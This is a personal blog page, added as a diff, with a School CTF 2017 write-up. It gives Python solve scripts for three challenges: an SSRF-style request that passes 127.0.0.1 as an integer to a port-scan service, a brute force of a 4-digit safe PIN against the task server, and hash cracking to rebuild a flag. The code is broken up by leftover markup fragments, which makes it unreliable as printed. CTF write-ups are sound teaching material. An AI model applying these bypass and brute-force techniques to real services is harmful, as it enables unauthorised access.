@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>School CTF 2017 - Write Up :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Task URLCan you find it?
+Task URLdefip2long(ip): aton =inet_aton(ip) returnunpack(&amp;rdquo;!L&amp;quot;,aton)[0]
+defmain(): URL =&amp;quot;http://portscan.task.school-CTF.org/port&amp;quot;IP =&amp;quot;127.0.0.1&amp;quot;HOST =ip2long(IP) PORT =&amp;quot;31337&amp;quot;print&amp;quot;Host : {}&amp;ldquo;.format(HOST) r =requests.post(URL,data={&amp;quot;host&amp;quot;: HOST,&amp;quot;port&amp;quot;: PORT}) raw_content =r.content flag =re.findall(&amp;quot;SchoolCTF{.*?}&amp;ldquo;,raw_content) print&amp;quot;Flag : {}&amp;ldquo;.format(flag[0]) if__name__==&amp;rsquo;main&amp;lsquo;: main() p.s. It seems that one of them said that they haven&amp;rsquo;t yet fully configured the security system and the password can be cracked. Safe URLdefa(pin): if(int(pin[0]) &#43;int(pin[1]) &#43;int(pin[2])) %10==int(pin[3]): returnpin else: returnNonepin_list =[] prod_pin =product(&amp;quot;123456789&amp;quot;,repeat=4) prod_pin =[&amp;quot;&amp;ldquo;.join(x) forx inlist(prod_pin)] prod_pin =map(a,prod_pin) prod_pin =filter(None,prod_pin) prod_pin =list(set(prod_pin)) pin_list&#43;=prod_pin"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="rhamaa.github.io/post/2017-11-27-school-ctf-2017/" />
+
+
+
+
+
+<link rel="stylesheet" href="rhamaa.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="rhamaa.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="rhamaa.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="rhamaa.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="School CTF 2017 - Write Up"/>
+<meta name="twitter:description" content="Task URLCan you find it?
+Task URLdefip2long(ip): aton =inet_aton(ip) returnunpack(&rdquo;!L&quot;,aton)[0]
+defmain(): URL =&quot;http://portscan.task.school-CTF.org/port&quot;IP =&quot;127.0.0.1&quot;HOST =ip2long(IP) PORT =&quot;31337&quot;print&quot;Host : {}&ldquo;.format(HOST) r =requests.post(URL,data={&quot;host&quot;: HOST,&quot;port&quot;: PORT}) raw_content =r.content flag =re.findall(&quot;SchoolCTF{.*?}&ldquo;,raw_content) print&quot;Flag : {}&ldquo;.format(flag[0]) if__name__==&rsquo;main&lsquo;: main() p.s. It seems that one of them said that they haven&rsquo;t yet fully configured the security system and the password can be cracked. Safe URLdefa(pin): if(int(pin[0]) &#43;int(pin[1]) &#43;int(pin[2])) %10==int(pin[3]): returnpin else: returnNonepin_list =[] prod_pin =product(&quot;123456789&quot;,repeat=4) prod_pin =[&quot;&ldquo;.join(x) forx inlist(prod_pin)] prod_pin =map(a,prod_pin) prod_pin =filter(None,prod_pin) prod_pin =list(set(prod_pin)) pin_list&#43;=prod_pin"/>
+
+
+
+<meta property="og:title" content="School CTF 2017 - Write Up" />
+<meta property="og:description" content="Task URLCan you find it?
+Task URLdefip2long(ip): aton =inet_aton(ip) returnunpack(&rdquo;!L&quot;,aton)[0]
+defmain(): URL =&quot;http://portscan.task.school-CTF.org/port&quot;IP =&quot;127.0.0.1&quot;HOST =ip2long(IP) PORT =&quot;31337&quot;print&quot;Host : {}&ldquo;.format(HOST) r =requests.post(URL,data={&quot;host&quot;: HOST,&quot;port&quot;: PORT}) raw_content =r.content flag =re.findall(&quot;SchoolCTF{.*?}&ldquo;,raw_content) print&quot;Flag : {}&ldquo;.format(flag[0]) if__name__==&rsquo;main&lsquo;: main() p.s. It seems that one of them said that they haven&rsquo;t yet fully configured the security system and the password can be cracked. Safe URLdefa(pin): if(int(pin[0]) &#43;int(pin[1]) &#43;int(pin[2])) %10==int(pin[3]): returnpin else: returnNonepin_list =[] prod_pin =product(&quot;123456789&quot;,repeat=4) prod_pin =[&quot;&ldquo;.join(x) forx inlist(prod_pin)] prod_pin =map(a,prod_pin) prod_pin =filter(None,prod_pin) prod_pin =list(set(prod_pin)) pin_list&#43;=prod_pin" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="rhamaa.github.io/post/2017-11-27-school-ctf-2017/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="rhamaa.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="rhamaa.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="rhamaa.github.io/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="rhamaa.github.io/post/2017-11-27-school-ctf-2017/">School CTF 2017 - Write Up</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by CTF.Ninja</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="rhamaa.github.io/tags/schoolctf2017/">SchoolCTF2017</a>&nbsp;
+        
+          #<a href="rhamaa.github.io/tags/ctf/">CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/CTF.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->Task URL<!-- raw HTML omitted -->
+<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p>Can you find it?</p>
+<p><!-- raw HTML omitted -->Task URL<!-- raw HTML omitted -->
+<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->def<!-- raw HTML omitted --> <!-- raw HTML omitted -->ip2long<!-- raw HTML omitted -->(<!-- raw HTML omitted -->ip<!-- raw HTML omitted -->):
+aton <!-- raw HTML omitted -->=<!-- raw HTML omitted --> inet_aton(ip)
+<!-- raw HTML omitted -->return<!-- raw HTML omitted --> unpack(<!-- raw HTML omitted -->&rdquo;!L&quot;<!-- raw HTML omitted -->,aton)[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->]</p>
+<p><!-- raw HTML omitted -->def<!-- raw HTML omitted --> <!-- raw HTML omitted -->main<!-- raw HTML omitted -->():
+URL <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;http://portscan.task.school-CTF.org/port&quot;<!-- raw HTML omitted -->
+IP <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;127.0.0.1&quot;<!-- raw HTML omitted -->
+HOST <!-- raw HTML omitted -->=<!-- raw HTML omitted --> ip2long(IP)
+PORT <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;31337&quot;<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Host : {}&ldquo;<!-- raw HTML omitted -->.format(HOST)
+r <!-- raw HTML omitted -->=<!-- raw HTML omitted --> requests.post(URL,<!-- raw HTML omitted -->data<!-- raw HTML omitted --><!-- raw HTML omitted -->=<!-- raw HTML omitted -->{<!-- raw HTML omitted -->&quot;host&quot;<!-- raw HTML omitted --> : HOST,<!-- raw HTML omitted -->&quot;port&quot;<!-- raw HTML omitted --> : PORT})
+raw_content <!-- raw HTML omitted -->=<!-- raw HTML omitted --> r.content
+flag <!-- raw HTML omitted -->=<!-- raw HTML omitted --> re.findall(<!-- raw HTML omitted -->&quot;SchoolCTF{.*?}&ldquo;<!-- raw HTML omitted -->,raw_content)
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Flag : {}&ldquo;<!-- raw HTML omitted -->.format(flag[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->])
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> <!-- raw HTML omitted -->__name__<!-- raw HTML omitted --> <!-- raw HTML omitted -->==<!-- raw HTML omitted --> <!-- raw HTML omitted -->&rsquo;<strong>main</strong>&lsquo;<!-- raw HTML omitted -->:
+main()
+<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p>p.s. It seems that one of them said that they haven&rsquo;t yet fully configured the security system and the password can be cracked.
+<!-- raw HTML omitted -->Safe URL<!-- raw HTML omitted -->
+<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->def<!-- raw HTML omitted --> <!-- raw HTML omitted -->a<!-- raw HTML omitted -->(<!-- raw HTML omitted -->pin<!-- raw HTML omitted -->):
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> (<!-- raw HTML omitted -->int<!-- raw HTML omitted -->(pin[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->]) <!-- raw HTML omitted -->+<!-- raw HTML omitted --> <!-- raw HTML omitted -->int<!-- raw HTML omitted -->(pin[<!-- raw HTML omitted -->1<!-- raw HTML omitted -->]) <!-- raw HTML omitted -->+<!-- raw HTML omitted --> <!-- raw HTML omitted -->int<!-- raw HTML omitted -->(pin[<!-- raw HTML omitted -->2<!-- raw HTML omitted -->])) <!-- raw HTML omitted -->%<!-- raw HTML omitted --> <!-- raw HTML omitted -->10<!-- raw HTML omitted --> <!-- raw HTML omitted -->==<!-- raw HTML omitted --> <!-- raw HTML omitted -->int<!-- raw HTML omitted -->(pin[<!-- raw HTML omitted -->3<!-- raw HTML omitted -->]):
+<!-- raw HTML omitted -->return<!-- raw HTML omitted --> pin
+<!-- raw HTML omitted -->else<!-- raw HTML omitted -->:
+<!-- raw HTML omitted -->return<!-- raw HTML omitted --> <!-- raw HTML omitted -->None<!-- raw HTML omitted -->
+pin_list <!-- raw HTML omitted -->=<!-- raw HTML omitted --> []
+prod_pin <!-- raw HTML omitted -->=<!-- raw HTML omitted --> product(<!-- raw HTML omitted -->&quot;123456789&quot;<!-- raw HTML omitted -->,<!-- raw HTML omitted -->repeat<!-- raw HTML omitted --><!-- raw HTML omitted -->=<!-- raw HTML omitted --><!-- raw HTML omitted -->4<!-- raw HTML omitted -->)
+prod_pin <!-- raw HTML omitted -->=<!-- raw HTML omitted --> [<!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->.join(x) <!-- raw HTML omitted -->for<!-- raw HTML omitted --> x <!-- raw HTML omitted -->in<!-- raw HTML omitted --> <!-- raw HTML omitted -->list<!-- raw HTML omitted -->(prod_pin)]
+prod_pin <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->map<!-- raw HTML omitted -->(a,prod_pin)
+prod_pin <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->filter<!-- raw HTML omitted -->(<!-- raw HTML omitted -->None<!-- raw HTML omitted -->,prod_pin)
+prod_pin <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->list<!-- raw HTML omitted -->(<!-- raw HTML omitted -->set<!-- raw HTML omitted -->(prod_pin))
+pin_list<!-- raw HTML omitted -->+=<!-- raw HTML omitted -->prod_pin</p>
+<p><!-- raw HTML omitted -->for<!-- raw HTML omitted --> pin <!-- raw HTML omitted -->in<!-- raw HTML omitted --> pin_list:
+pin <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->.join(pin)
+r <!-- raw HTML omitted -->=<!-- raw HTML omitted -->requests.post(URL,<!-- raw HTML omitted -->data<!-- raw HTML omitted --><!-- raw HTML omitted -->=<!-- raw HTML omitted -->{<!-- raw HTML omitted -->&quot;key&quot;<!-- raw HTML omitted --> : pin, <!-- raw HTML omitted -->&quot;captcha&quot;<!-- raw HTML omitted --> : <!-- raw HTML omitted -->&quot;SEMBARANGAJA&quot;<!-- raw HTML omitted -->})
+resp <!-- raw HTML omitted -->=<!-- raw HTML omitted --> r.content
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;wrong&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted -->in<!-- raw HTML omitted --> resp:
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Wrong {}&ldquo;<!-- raw HTML omitted -->.format(pin)
+<!-- raw HTML omitted -->continue<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->else<!-- raw HTML omitted -->:
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Found pin {}&ldquo;<!-- raw HTML omitted -->.format(pin)
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Found pin {}&ldquo;<!-- raw HTML omitted -->.format(pin)
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Found pin {}&ldquo;<!-- raw HTML omitted -->.format(pin)
+<!-- raw HTML omitted -->break<!-- raw HTML omitted -->
+<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->Task.elf<!-- raw HTML omitted -->
+<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->BruteMe.exe<!-- raw HTML omitted -->
+<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p>leters <!-- raw HTML omitted -->=<!-- raw HTML omitted --> string.ascii_letters <!-- raw HTML omitted -->+<!-- raw HTML omitted --> string.punctuation <!-- raw HTML omitted -->+<!-- raw HTML omitted --> string.digits</p>
+<p><!-- raw HTML omitted -->def<!-- raw HTML omitted --> <!-- raw HTML omitted -->generator<!-- raw HTML omitted -->(<!-- raw HTML omitted -->n<!-- raw HTML omitted --><!-- raw HTML omitted -->=<!-- raw HTML omitted --><!-- raw HTML omitted -->1<!-- raw HTML omitted -->):
+a <!-- raw HTML omitted -->=<!-- raw HTML omitted --> itertools.product(leters,<!-- raw HTML omitted -->repeat<!-- raw HTML omitted --><!-- raw HTML omitted -->=<!-- raw HTML omitted -->n)
+<!-- raw HTML omitted -->return<!-- raw HTML omitted --> a</p>
+<p><!-- raw HTML omitted -->def<!-- raw HTML omitted --> <!-- raw HTML omitted -->text3<!-- raw HTML omitted -->():
+<!-- raw HTML omitted -->for<!-- raw HTML omitted --> char <!-- raw HTML omitted -->in<!-- raw HTML omitted --> generator(<!-- raw HTML omitted -->3<!-- raw HTML omitted -->):
+char <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->.join(char)
+possible <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Ooooh so{}salty&quot;<!-- raw HTML omitted -->.format(char)
+hashMD5 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> hashlib.md5(possible).hexdigest()
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> hashMD5 <!-- raw HTML omitted -->==<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;d0061dcf056a06713d5a757e0288d1b3&quot;<!-- raw HTML omitted -->:
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Found Text3 {}&ldquo;<!-- raw HTML omitted -->.format(char)
+<!-- raw HTML omitted -->return<!-- raw HTML omitted --> char
+<!-- raw HTML omitted -->else<!-- raw HTML omitted -->:
+<!-- raw HTML omitted -->continue<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->def<!-- raw HTML omitted --> <!-- raw HTML omitted -->text4<!-- raw HTML omitted -->():
+<!-- raw HTML omitted -->for<!-- raw HTML omitted --> char <!-- raw HTML omitted -->in<!-- raw HTML omitted --> generator(<!-- raw HTML omitted -->1<!-- raw HTML omitted -->):
+char <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->.join(char)
+hash384 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> hashlib.sha384(char).hexdigest()
+possible <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Stop trying to crack me god damnit!!!{}&ldquo;<!-- raw HTML omitted -->.format(hash384)
+hashMD5 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> hashlib.md5(possible).hexdigest()
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> hashMD5 <!-- raw HTML omitted -->==<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;5056e21f6af2a289c9c3116c16bba55f&quot;<!-- raw HTML omitted -->:
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Found Text4 {}&ldquo;<!-- raw HTML omitted -->.format(char)
+<!-- raw HTML omitted -->return<!-- raw HTML omitted --> char
+<!-- raw HTML omitted -->else<!-- raw HTML omitted -->:
+<!-- raw HTML omitted -->continue<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->def<!-- raw HTML omitted --> <!-- raw HTML omitted -->text7<!-- raw HTML omitted -->():
+hash384 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> hashlib.sha384(<!-- raw HTML omitted -->&quot;Oh, i see you reading my source code! &gt;:)&ldquo;<!-- raw HTML omitted -->).hexdigest()
+<!-- raw HTML omitted -->for<!-- raw HTML omitted --> char <!-- raw HTML omitted -->in<!-- raw HTML omitted --> generator(<!-- raw HTML omitted -->2<!-- raw HTML omitted -->):
+char <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->.join(char)
+possible <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&rdquo;{0}{1}&ldquo;<!-- raw HTML omitted -->.format(hash384,char)
+hashMD5 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> hashlib.md5(possible).hexdigest()
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> hashMD5 <!-- raw HTML omitted -->==<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;c866a4f386df3da51a54c1f8434603eb&quot;<!-- raw HTML omitted -->:
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Found Text7 {}&ldquo;<!-- raw HTML omitted -->.format(char)
+<!-- raw HTML omitted -->return<!-- raw HTML omitted --> char
+<!-- raw HTML omitted -->else<!-- raw HTML omitted -->:
+<!-- raw HTML omitted -->continue<!-- raw HTML omitted --> <br>
+<!-- raw HTML omitted -->def<!-- raw HTML omitted --> <!-- raw HTML omitted -->text8<!-- raw HTML omitted -->():
+hash384 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> hashlib.sha384(hashlib.sha512(<!-- raw HTML omitted -->&quot;FILL THE POWER OF SHA&quot;<!-- raw HTML omitted -->).hexdigest()).hexdigest()
+<!-- raw HTML omitted -->for<!-- raw HTML omitted --> char <!-- raw HTML omitted -->in<!-- raw HTML omitted --> generator(<!-- raw HTML omitted -->2<!-- raw HTML omitted -->):
+char <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->.join(char)
+possible <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&rdquo;{0}{1}&ldquo;<!-- raw HTML omitted -->.format(hash384,char)
+hashMD5 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> hashlib.sha256(possible).hexdigest()
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> hashMD5 <!-- raw HTML omitted -->==<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;7f6e2c5beefd0fd0000c3a72db28b54d0819a93f5cc87a48507f79cdac37cfe0&quot;<!-- raw HTML omitted -->:
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Found Text8 {}&ldquo;<!-- raw HTML omitted -->.format(char)
+<!-- raw HTML omitted -->return<!-- raw HTML omitted --> char
+<!-- raw HTML omitted -->else<!-- raw HTML omitted -->:
+<!-- raw HTML omitted -->continue<!-- raw HTML omitted --> <br>
+<!-- raw HTML omitted -->def<!-- raw HTML omitted --> <!-- raw HTML omitted -->main<!-- raw HTML omitted -->():
+<!-- raw HTML omitted --># p1,p3,p5, and p6 obtained from :<!-- raw HTML omitted -->
+<!-- raw HTML omitted --># <a href="http://hashkiller.co.uk">http://hashkiller.co.uk</a><!-- raw HTML omitted -->
+<!-- raw HTML omitted --># <a href="https://md5hashing.net/">https://md5hashing.net/</a><!-- raw HTML omitted -->
+p1 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;541&quot;<!-- raw HTML omitted -->
+p2 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&rdquo;____&ldquo;<!-- raw HTML omitted -->
+p3 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->
+p4 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->
+p5 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;19&quot;<!-- raw HTML omitted -->
+p6 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;757&quot;<!-- raw HTML omitted -->
+p7 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->
+p8 <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->
+p3 <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> text3()
+p4 <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> text4()
+p7 <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> text7()
+p8 <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> text8()
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;Flag : SchoolCTF{&ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted -->+<!-- raw HTML omitted -->p8[<!-- raw HTML omitted -->1<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted --> p8[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted --> p6[<!-- raw HTML omitted -->1<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted --> p6[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted --> p2[<!-- raw HTML omitted -->3<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted --> p7[<!-- raw HTML omitted -->1<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted --> p1[<!-- raw HTML omitted -->1<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted --> p1[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted --> p7[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted --> p2[<!-- raw HTML omitted -->1<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted -->  p1[<!-- raw HTML omitted -->2<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted -->  p6[<!-- raw HTML omitted -->2<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted -->  p2[<!-- raw HTML omitted -->2<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted -->  p3[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted -->  <!-- raw HTML omitted -->'y'<!-- raw HTML omitted --><!-- raw HTML omitted -->+<!-- raw HTML omitted -->  p2[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted -->  p3[<!-- raw HTML omitted -->1<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted -->  p3[<!-- raw HTML omitted -->2<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted -->  <!-- raw HTML omitted -->'r'<!-- raw HTML omitted --><!-- raw HTML omitted -->+<!-- raw HTML omitted -->  p4[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted -->  p5[<!-- raw HTML omitted -->0<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted -->  <!-- raw HTML omitted -->'n'<!-- raw HTML omitted --><!-- raw HTML omitted -->+<!-- raw HTML omitted -->  p5[<!-- raw HTML omitted -->1<!-- raw HTML omitted -->]<!-- raw HTML omitted -->+<!-- raw HTML omitted --><!-- raw HTML omitted -->&rdquo;}&ldquo;<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->if<!-- raw HTML omitted --> <!-- raw HTML omitted -->__name__<!-- raw HTML omitted --> <!-- raw HTML omitted -->==<!-- raw HTML omitted --> <!-- raw HTML omitted -->&rsquo;<strong>main</strong>&lsquo;<!-- raw HTML omitted -->:
+main()
+<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="rhamaa.github.io/post/2017-11-21-rc3-ctf-2017/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">RC3 CTF 2017 Write Up</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="rhamaa.github.io/post/2017-11-15-school-ctf-2017/">
+                  <span class="button__text">School CTF 2017 Write Up</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="rhamaa.github.io/assets/main.js"></script>
+<script src="rhamaa.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
